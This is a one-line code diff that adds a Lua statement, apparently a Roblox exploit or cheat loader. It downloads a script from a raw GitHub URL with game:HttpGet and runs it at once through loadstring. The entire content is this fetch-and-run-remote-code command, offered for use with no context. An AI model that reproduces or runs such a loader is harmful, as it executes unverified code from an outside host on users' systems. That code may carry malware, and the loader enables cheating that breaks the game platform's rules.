@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/bloodlines-spam3-r4kwjs3pmdld9r.lua"))()
